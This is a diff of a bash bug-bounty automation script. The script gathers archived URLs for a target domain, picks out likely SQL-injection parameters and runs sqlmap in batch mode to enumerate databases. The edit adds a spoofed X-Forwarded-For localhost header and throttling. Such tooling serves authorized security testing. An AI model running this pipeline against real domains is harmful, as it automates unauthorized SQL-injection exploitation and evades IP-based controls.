@@ -62,7 +62,7 @@ echo "Takeovers -> $(wc -l < /root/results/$domain/vulns/takeovers.txt)" | notif
 # SQLI
 echo -e "Listing sql injections on $domain" | notify -bulk -silent
 cat /root/results/$domain/wayback_data/all-urls.txt | gf sqli | qsreplace 'FUZZ' | uro | tee -a sqli.tmp
-sqlmap -m sqli.tmp --dbs --proxy=$proxy --batch --risk 3 --level 5 | tee -a /root/results/$domain/vulns/sql_injection.txt
+sqlmap -m sqli.tmp --dbs --proxy=$proxy --batch --headers="X-Forwarded-For: 127.0.0.1" --risk 2 --level 3 --delay=0.5 | tee -a /root/results/$domain/vulns/sql_injection.txt
 echo -e "SQLMAP has finished -> $(wc -l < /root/results/$domain/vulns/sql_injection.txt)" | notify -bulk -silent
 rm sqli.tmp
 
